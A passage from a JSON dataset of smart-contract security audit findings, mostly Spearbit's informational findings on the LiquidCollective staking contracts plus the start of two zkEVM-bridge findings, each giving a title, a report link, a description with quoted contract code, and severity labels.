        "body": "At the time of writing this issue in the latest commit at 030b52feb5af2dd2ad23da0d512c5b0e55eb8259, in the natspec docs of OracleMembers there is a @dev comment that says @dev There can only be up to 256 oracle members. This is due to how report statuses are stored in Reports Positions If we look at ReportsPositions.sol the natspec docs explains that Each bit in the stored uint256 value tells if the member at a given index has reported But both Oracle.addMember and OracleMembers.push do not prevent the admin to add more than 256 items to the list of oracle members. If we look at the result of the test (located in Appendix), we can see that:  It's possible to add more than 256 oracle members.  The result of oracle.getMemberReportStatus(oracleMember257) return true even if the oracle member has not reported yet.  Because of that, oracle.reportConsensusLayerData (executed by oracleMember257) reverts correctly.  If we remove a member from the list (for example oracle member with index 1) the oracleMember257 it will be able to vote because will be swapped with the removed member and at oracle.getMemberReportStatus(oracleMember257) return false. this point 45",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "ApprovalsPerOwner.set does not check if owner or spender is address(0).",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "When ApprovalsPerOwner value is set for an owner and a spender, the addresses of the owner and the spender are not checked against address(0).",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Quorum could be higher than the number of oracles, DOSing the Oracle contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of Oracle.setQuorum only checks if the _newQuorum input parameter is not 0 or equal to the current quorum value. By setting a quorum higher than the number of oracle members, no quorum could be reached for the current or future slots.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "ConsensusLayerDepositManager.depositToConsensusLayer should be called only after a quorum has been reached to avoid rewarding validators that have not performed during the frame",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Alluvial is not tracking timestamps or additional information of some actions that happen on-chain like  when operator validator is funded on the beacon chain.  when an operator is added.  when validators are added or removed.  when a quorum is reached.  when rewards/penalties/slashes happen and which validator is involved.  and so on... 46 By not having these enriched informations it could happen that validators that have not contributed to a frame will still get rewards and this could be not fair to other validators that have contributed to the overall balance by working and bringing rewards. Let's make an example: we have 10 operators with 1k validators each at the start of a frame. At some point during the very end of the frame validato_10 get approved 9k validators and all of them get funded. Those validators only participated a small fraction in the production of the rewards. But because there's no way to track these timing and because oracles do not know anything about these (they just need to report the balance and the number of validators during the frame) they will report and arrive to a quorum of reportBeacon(correctEpoch, correctAmountOfBalance, 21_000) that will trigger the OracleManagerV1.setBeaconData. The contract check that 21_000 > DepositedValidatorCount.get() will pass and _onEarnings is called. Let's not consider the math involved in the process of calculating the number of shares to be distributed based on the staked balance delta, let's say that because of all the increase in capital Alluvial will call _rewardOperators(1_- 000_000); distributing 1_000_000 shares to operators based on the number of validators that produced that reward. Because as we said we do not know how much each validator has contributed, those shares will be contributed in the same way to operators that could have not contributed at all to the epoch. This is true for both scenarios where validators that have joined or exited the beacon chain not at the start of the epoch where the last quorum was set.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document the decision to include executionLayerFees in the logic to trigger _onEarnings to dis- tribute rewards to Operators and Treasury",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The setBeaconData function from OracleManager contract is called when oracle members have reached a quorum. The function after checking that the report data respects some integrity check performs a check to distribute rewards to operators and treasury if needed: uint256 executionLayerFees = _pullELFees(); if (previousValidatorBalanceSum < _validatorBalanceSum + executionLayerFees) { _onEarnings((_validatorBalanceSum + executionLayerFees) - previousValidatorBalanceSum); } The delta between _validatorBalanceSum and previousValidatorBalanceSum is the sum of all the rewards, penalties and slashes that validators have accumulated during the validation work of one or multiple frames. By adding executionLayerFees to the check, it means that even if the validators have performed poorly (the sum of rewards is less than the sum of penalties+slash) they could still get rewards if executionLayerFees is greater than the negative delta of newSum-prevSum. If we look at the natspec of the _onEarnings it seems that only the validator's balance (without fees) should be used in the if check. 47 /// @notice Handler called if the delta between the last and new validator balance sum is positive /// @dev Must be overriden /// @param _profits The positive increase in the validator balance sum (staking rewards) function _onEarnings(uint256 _profits) internal virtual;",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider documenting how and if funds from the execution layer fee recipient are considered inside the annualAprUpperBound and relativeLowerBound boundaries.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "When oracle members reach a quorum, the _pushToRiver function is called. Alluvial is performing some sanity check to prevent malicious oracle member to report malicious beacon data. Inside the function, uint256 prevTotalEth = IRiverV1(payable(address(riverAddress))).totalUnderlyingSupply(); riverAddress.setBeaconData(_validatorCount, _balanceSum, bytes32(_epochId)); uint256 postTotalEth = IRiverV1(payable(address(riverAddress))).totalUnderlyingSupply(); uint256 timeElapsed = (_epochId - LastEpochId.get()) * _beaconSpec.slotsPerEpoch * _beaconSpec.secondsPerSlot; ,! _sanityChecks(postTotalEth, prevTotalEth, timeElapsed); function _sanityChecks(uint256 _postTotalEth, uint256 _prevTotalEth, uint256 _timeElapsed) internal ,! view { if (_postTotalEth >= _prevTotalEth) { uint256 annualAprUpperBound = BeaconReportBounds.get().annualAprUpperBound; if ( uint256(10000 * 365 days) * (_postTotalEth - _prevTotalEth) > annualAprUpperBound * _prevTotalEth * _timeElapsed ) { revert BeaconBalanceIncreaseOutOfBounds(_prevTotalEth, _postTotalEth, _timeElapsed, ,! annualAprUpperBound); } } else { uint256 relativeLowerBound = BeaconReportBounds.get().relativeLowerBound; if (uint256(10000) * (_prevTotalEth - _postTotalEth) > relativeLowerBound * _prevTotalEth) { revert BeaconBalanceDecreaseOutOfBounds(_prevTotalEth, _postTotalEth, _timeElapsed, relativeLowerBound); } ,! } } Both prevTotalEth and postTotalEth call SharesManager.totalUnderlyingSupply() that returns the value from Inside those balance is also included the amount of fees that are pulled from the River._assetBalance(). ELFeeRecipient (Execution Layer Fee Recipient). Alluvial should document how and if funds from the execution layer fee recipient are also considered inside the annualAprUpperBound and relativeLowerBound boundaries. 48",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Allowlist.allow allows arbitrary values for _statuses input",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of allow does not check if the value inside each _statuses item is a valid value or not. The function can be called by both the administrator or the allower (roles authorized to manage the user permissions) that can specify arbitrary values to be assigned to the corresponding _accounts item. The user's permissions handled by Allowlist are then used by the River contract in different parts of the code. Those permissions inside the River contracts are a limited set of permissions that could not match what the allower /admin of the Allowlist has used to update a user's permission when the allow function was called.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider exploring a way to update the withdrawal credentials and document all the possible scenarios",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The withdrawal credentials is currently set when River.initRiverV1 is called. The func- tion will internally call ConsensusLayerDepositManager.initConsensusLayerDepositManagerV1 that will perform WithdrawalCredentials.set(_withdrawalCredentials); After initializing the withdrawal credentials, there's no way to update it and change it. The withdrawal cre- dentials is a key part of the whole protocol and everything that concern it should be well documented including all the worst-case scenario  What if the withdrawal credentials is lost?  What if the withdrawal credentials is compromised?  What if the withdrawal credentials must be changed (lost, compromised or simply the wrong one has been submitted)? What should be implemented inside the Alluvial logic to use the new withdrawal creden- tials for the operator's validators that have not been funded yet (the old withdrawal credentials has not been sent to the Deposit contract)? Note that currently there's seem to be no way to update the withdrawal credentials for a validator already submitted to the Deposit contract.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Oracle contract allows members to skip frames and report them (even if they are past) one by one or all at once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of reportBeacon allows oracle members to skip frames (255 epochs) and report them (even if they are past) one by one or all at once. Let's assume that members arrived to a quorum for epochId_X. When quorum is reached, _pushToRiver is called, and it will update the following properties:  clean all the storage used for member reporting.  set ExpectedEpochId to epochId_X + 255.  set LastEpochId to epochId_X. With this context, let's assume that members decide to wait 30 frames (30 days) or that for 30 days they cannot arrive at quorum. At the new time, the new epoch would be epochId_X + 255 * 30 The following scenarios can happen:  1) Report at once all the missed epochs Instead of reporting only the current epoch (epochId_X + 255 * 30), they will report all the previous \"skipped\" epochs that are in the past. In this scenario, ExpectedEpochId contains the number of the expected next epoch assigned 30 days ago from the previous call to _pushToRiver. In reportBeacon if the _epochId is what the system expect (equal to Expect- edEpochId) the report can go on. So to be able to report all the missing reports of the \"skipped\" frames the member just need to call in a se- quence reportBeacon(epochId_X + 255, ...), reportBeacon(epochId_X + 255 + 255, ...) + .... + report- Beacon(epochId_X + 255 * 30, ...)  2) Report only the last epoch In this scenario, they would call directly reportBeacon(epochId_X + 255 * 30, ...). _pushToRiver call _sani- tyChecks to perform some checks as do not allow changes in the amount of staked ether that are below or above some bounds. The call that would be made is _sanityChecks(oracleReportedStakedBalance, prevTotalEth, timeElapsed) where timeElapsed is calculated as uint256 timeElapsed = (_epochId - LastEpochId.get()) * _beacon- Spec.slotsPerEpoch * _beaconSpec.secondsPerSlot; So, time elapsed is the number of seconds between the reported epoch and the LastEpochId. But in this scenario, LastEpochId has the old value from the previous call to _pushToRiver made 30 days ago that will be epochId_X. Because of this, the check made inside _sanityChecks for the upper bound would be more relaxed, allowing a wider spread between oracleReportedStakedBalance and prevTotalEth",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming OperatorResolution.active to a more meaningful name",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The name active in the struct OperatorResolution could be misleading because it can be confused with the fact that an operator (the struct containing the real operator information is Operator ) is active or not. The value of OperatorResolution.active does not represent if an operator is active, but is used to know if the index associated to the struct's item (OperatorResolution.index) is used or not.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "lsETH and WlsETH's name() functions return inconsistent name.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "lsETH.name() is River Ether, while WlsETH.name() is Wrapped Alluvial Ether.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Rename modifiers to have consistent naming and patterns only<ROLE>.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The modifiers ifGovernor and ifGovernorOrExecutor in Firewall.sol have a different naming conventions and also logical patterns.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "OperatorResolution.active might be a redundant struct field which can be removed.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The value of active stays true once it has been set true for a given index. This is especially true since the only call to Operators.set is from OperatorsRegistryV1.addOperator which does not override values for already registered names.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "The expression for selectedOperatorAvailableKeys in OperatorsRegistry can be simplified.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "tors[selectedOperatorIndex].keys. Since the places that the limit has been set with a value other than 0 has checks against going above keys bound: operators[selectedOperatorIndex].limit is always less than or equal OperatorsRegistry.1.sol#L250-L252 if (_newLimits[idx] > operator.keys) { revert OperatorLimitTooHigh(_newLimits[idx], operator.keys); } OperatorsRegistry.1.sol#L324-L326 if (keyIndex >= operator.keys) { revert InvalidIndexOutOfBounds(); } OperatorsRegistry.1.sol#L344-L346 52 if (_indexes[_indexes.length - 1] < operator.limit) { operator.limit = _indexes[_indexes.length - 1]; }",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "The unused constant DELTA_BASE can be removed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The constant DELTA_BASE in BeaconReportBounds is never used.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused modifiers",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The modifier active(uint256 _index) is not used in the project.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Modifier names do not follow the same naming patterns",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The modifier names do not follow the same naming patterns in OperatorsRegistry.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "In AllowlistV1.allow the input variable _statuses can be renamed to better represent that values it holds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In AllowlistV1.allow the input variable _statuses can be renamed to better represent the values it holds. _statuses is a bitmap where each bit represents a particular action that a user can take.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "riverAddress can be renamed to river and we can avoid extra interface casting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "riverAddress's name suggest that it is only an address. Although it is an address with the IRiverV1 attached to it. Also, we can avoid unnecessary casting of interfaces.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Define named constants for numeric literals",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In _sanitychecks there 2 numeric literals 10000 and 365 days used: uint256(10000 * 365 days) * (_postTotalEth - _prevTotalEth) ... if (uint256(10000) * (_prevTotalEth - _postTotalEth) > relativeLowerBound * _prevTotalEth) {",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Move memberIndex and ReportsPositions checks at the beginning of the OracleV1.reportBeacon function.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The checks for memberIndex == -1 and ReportsPositions.get(uint256(memberIndex)) happen in the middle of reportBeacon after quite a few calculations are done.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document what incentivizes the operators to run their validators when globalFee is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If GlobalFee could be 0, then neither the treasury nor the operators earn rewards. What factor would motivate the operators to keep their validators running?",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document how Alluvial plans to prevent institutional investors and operators get into business directly and bypass using the River protocol.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Since the list of operators and also depositors can be looked up from the information on-chain, what would prevent Institutional investors (users) and the operators to do business outside of River? Is there going to be an off-chain legal contract between Alluvial and these other entities to prevent this scenario?",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Document how operator rewards will be distributed if OperatorRewardsShare is zero",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "If OperatorRewardsShare could be 0, then the operators won't earn rewards. What factor would motivate the operators to keep their validators running? Sidenote: Other incentives for the operators to keep their validators running (if their reward share portion is 0) would be some sort of MEV or block proposal/attestation bribes. Related: Avoid to waste gas distributing rewards when the number of shares to be distributed is zero",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Current operator reward distribution does not favor more performant operators",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Reward shares are distributed based on the fraction of the active funded non-stopped validators owned by an operator. This distribution of shares does not promote the honest operation of validators to the fullest extent. Since the oracle members don't report the delta in the balance of each validator, it is not possible to reward operators/validators that have been performing better than the rest. Also if a high-performing operator or operators were the main source of the beacon balance sum and if they had enough ETH to initially deposit into the ETH2.0 deposit contract on their own, they could have made more profit that way versus joining as an operator in the River protocol.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "TRANSFER_MASK == 0 which causes a no-op.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "TRANSFER_MASK is a named constant defined as 0 (River.1.sol#L37). Like the other masks DEPOSIT_- MASK and DENY_MASK which supposed to represent a bitmask, on the first look, you would think TRANSFER_MASK would need to also represent a bitmask. But if you take a look at _onTransfer: function _onTransfer(address _from, address _to) internal view override { IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_from, TRANSFER_MASK); // this call reverts if unauthorized or denied IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_to, TRANSFER_MASK); // this call reverts if unauthorized or denied ,! ,! } This would translate into calling onlyAllowed with the: IAllowlistV1(AllowlistAddress.get()).onlyAllowed(x, 0); Now if we look at the onlyAllowed function with these parameters: function onlyAllowed(x, 0) external view { uint256 userPermissions = Allowlist.get(x); if (userPermissions & DENY_MASK == DENY_MASK) { revert Denied(_account); } if (userPermissions & 0 != 0) { // <--- ( x & 0 != 0 ) == false revert Unauthorized(_account); } } Thus if the _from, _to addresses don't have their DENY_MASK set to 1 they would not trigger a revert since we would never step into the 2nd if block above when TRANSFER_MASK is passed to these functions. The TRANSFER_MASK is also used in _onDeposit: IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_depositor, DEPOSIT_MASK + TRANSFER_MASK); // DEPOSIT_MASK + TRANSFER_MASK == DEPOSIT_MASK ,! IAllowlistV1(AllowlistAddress.get()).onlyAllowed(_recipient, TRANSFER_MASK); // like above in ,! `_onTransfer`",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Reformat numeric literals with many digits for better readability.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Reformat numeric literals with many digits into a more readable form.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Firewall should follow the two-step approach present in River when transferring govern address",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Both River and OperatorsRegistry follow a two-step approach to transfer the ownership of the contract. 1) Propose a new owner storing the address in a pendingAdmin variable 2) The pending admins accept the new role by actively calling acceptOwnership This approach makes this crucial action much safer because 1) Prevent the admin to transfer ownership to address(0) given that address(0) cannot call acceptOwnership 2) Prevent the admin to transfer ownership to an address that cannot \"admin\" the contract if they cannot call acceptOwnership. For example, a contract do not have the implementation to at least call acceptOwnership. 3) Allow the current admin to stop the process by calling transferOwnership(address(0)) if the pending admin has not called acceptOwnership yet The current implementation does not follow this safe approach, allowing the governor to directly transfer the gov- ernor role to a new address.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "OperatorRegistry.removeValidators is resetting the limit (approved validators) even when not needed",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of removeValidators allow an admin or node operator to remove val- idators, passing to the function the list of validator's index to be removed. Note that the list of indexes must be ordered DESC. At the end of the function, we can see these checks if (_indexes[_indexes.length - 1] < operator.limit) { operator.limit = _indexes[_indexes.length - 1]; } That reset the operator's limit to the lower index value (this to prevent that a not approved key get swapped to a position inside the limit). The issue with this implementation is that it is not considering the case where all the operator's validators are already approved by Alluvial. In this case, if an operator removes the validator with the lower index, all the other validators get de-approved because the limit will be set to the lower limit. Consider this scenario: 59 op.limit = 10 op.keys = 10 op.funded = 0 This mean that all the validators added by the operator have been approved by Alluvial and are safe (keys == limit). If the operator or Alluvial call removeValidators([validatorIndex], [0]) removing the validator at index 0 this will  swap the validator_10 with validator_0.  set the limit to 0 because 0 < 10 (_indexes[_indexes.length - 1] < operator.limit). The consequence is that even if all the validators present before calling removeValidators were \"safe\" (because approved by Alluvial) the limit is now 0 meaning that all the validators are not \"safe\" anymore and cannot be selected by pickNextValidators.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider renaming transferOwnership to better reflect the function's logic",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of transferOwnership is not really transferring the ownership from the current admin to the new one. The function is setting the value of the Pending Admin that must subsequently call acceptOwnership to accept the role and confirm the transfer of the ownership.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Wrong return name used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The min function returns the minimum of the 2 inputs, but the return name used is max.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Discrepancy between architecture and code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The architecture diagram states that admin triggers deposits on the Consensus Layer Deposit Man- ager, but the depositToConsensusLayer() function allows anyone to trigger such deposits.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Consider replacing the remaining require with custom errors",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In the vast majority of the project contracts have defined and already use Custom Errors that provide a better UX, DX and gas saving compared to require statements. There are still some instances of require usage in ConsensusLayerDepositManager and BytesLib contracts that could be replaced with custom errors.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Both wlsETH and lsETH transferFrom implementation allow the owner of the token to use trans- ferFrom like if it was a \"normal\" transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of transferFrom allow the msg.sender to use the function like if it was a \"normal\" transfer. In this case, the allowance is checked only if the msg.sender is not equal to _from if (_from != msg.sender) { uint256 currentAllowance = ApprovalsPerOwner.get(_from, msg.sender); if (currentAllowance < _value) { revert AllowanceTooLow(_from, msg.sender, currentAllowance, _value); } ApprovalsPerOwner.set(_from, msg.sender, currentAllowance - _value); } This implementation diverge from what is usually implemented in both Solmate and OpenZeppelin.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Both wlsETH and lsETH tokens are reducing the allowance when the allowed amount is type(uint256).max",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The current implementation of the function transferFrom in both SharesManager.1.sol and WLSETH.1.sol is not taking into consideration the scenario where a user has approved a spender the maximum possible allowance type(uint256).max. The Alluvial transferFrom acts differently from standard ERC20 implementations like the one from Solmate and OpenZeppelin. In their implementation, they check and reduce the spender allowance if and only if the allowance is different from type(uint256).max.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing, confusing or wrong natspec comments",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "In the current implementation not all the constructors, functions, events, custom errors, variables or struct are covered by natspec comments. Some of them are only partially covered (missing @param, @return and so on). Note that the contracts listed in the context section of the issue have inside of them complete or partial missing natspec.  Natspec Fixes / Typos: River.1.sol#L38-L39 Swap the empty line with the NatSpec @notice - /// @notice Prevents unauthorized calls - + + /// @notice Prevents unauthorized calls OperatorsRegistry.1.sol#L44, OperatorsRegistry.1.sol#L61, OperatorsRegistry.1.sol#L114 Replace name with index. - /// @param _index The name identifying the operator + /// @param _index The index identifying the operator OperatorsRegistry.1.sol#L218 Replace cound with count. - /// @notice Changes the operator stopped validator cound + /// @notice Changes the operator stopped validator count  Expand the natspec explanation: We also suggest expanding some function's logic inside the natspec OperatorsRegistry.1.sol#L355-L358 Expand the natspec documentation and add a @return natspec comment clarifying that the returned value is the number of total operator and not the active/fundable one. ReportsVariants.sol#L5 Add a comment that explains the COUNT_OUTMASK's assignment. This will mask beaconValidators and beacon- Balance in the designed packing. xx...xx <beaconBalance> <beaconValidators> xxxx & COUNT_OUTMASK == 00...00 <beaconBalance> <beaconValidators> 0000 ReportsVariants.sol ReportsVariants should have a documentation regarding the packing used for ReportsVariants in an uint256: [ 0, 16) : <voteCount> oracle member's total vote count for the numbers below (uint16, 2 bytes) ,! [16, [48, 112) : <beaconBalance> 48) : <beaconValidators> total number of beacon validators (uint32, 4 bytes) total balance of all the beacon validators (uint64, 6 bytes) OracleMembers.sol Leave a comment/warning that only there could a maximum of 256 oracle members. This is due to the Report- sPosition setup where in an uint256, 1 bit is reserved for each oracle member's index. ReportsPositions.sol 63 Leave a comment/warning for the ReportsPosition setup that the ith bit in the uint256 represents whether or not there has been a beacon report by the ith oracle member. Oracle.1.sol#L202-L205 Leave a comment/warning that only there could a maximum of 256 oracle members. This is due to the Report- sPosition setup where in an uint256, 1 bit is reserved for each oracle member's index. Allowlist.1.sol#L46-L49 Leave a comment, warning that the permission bitmaps will be overwritten instead of them getting updated. OracleManager.1.sol#L44 Add more comment for _roundId to mention that when the setBeaconData is called by Oracle.1.sol:_push- ToRiver and that the value passed to it for this parameter is always the 1st epoch of a frame. OperatorsRegistry.1.sol#L304-L310 _indexes parameter, mentioning that this array: 1) needs to be duplicate-free and sorted (DESC) 2) each element in the array needs to be in a specific range, namely operator.[funded, keys). OperatorsRegistry.1.sol#L60-L62 Better rephrase the natspec comment to avoid further confusion. Oracle.1.sol#L284-L289 Update the reportBeacon natspec documentation about the _beaconValidators parameter to avoid further con- fusion. Client answer to the PR comment The docs should be updated to also reflect our plans for the Shanghai fork. Basically we can't just have the same behavior for a negative delta in validator count than with a positive delta (where we just assume that each validator that was in the queue only had 32 eth). Now when we exit validator we need to know how much was exited in order to compute the proper revenue value for the treasury and operator fee. This probably means that there will be an extra arg with the oracle to keep track of the exited eth value. But as long as the spec is not final, we'll stick to the validator count always growing. We should definitely add a custom error to explain that in case a report provides a smaller validator count.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused imports from code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The codebase has unused imports across the code base. If they are not used inside the contract, it would be better to remove them to avoid confusion.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing event emission in critical functions, init functions and setters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Some critical functions like contract's constructor, contract's init*(...)function (upgradable con- tracts) and some setter or in general critical functions are missing event emission. Event emissions are very useful for external web3 applications, but also for monitoring the usage and security of your protocol when paired with external monitoring tools. Note: in the init*(...)/constructor function, consider if adding a general broad event like ContractInitial- ized or split it in more specific events like QuorumUpdated+OwnerChanged+... 65 Note: in general, consider adding an event emission to all the init*(...) functions used to initialize the upgrad- able contracts, passing to the event the relevant args in addition to the version of the upgrade.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Funds can be sent to a non existing destination",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function bridgeAsset() and bridgeMessage() do check that the destination network is different If accidentally the wrong than the current network. However, they dont check if the destination network exists. networkId is given as a parameter, then the function is sent to a nonexisting network. If the network would be deployed in the future the funds would be recovered. However, in the meantime they are inaccessible and thus lost for the sender and recipient. Note: other bridges usually have validity checks on the destination. function bridgeAsset(...) ... { require(destinationNetwork != networkID, ... ); ... } function bridgeMessage(...) ... { require(destinationNetwork != networkID, ... ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fee on transfer tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
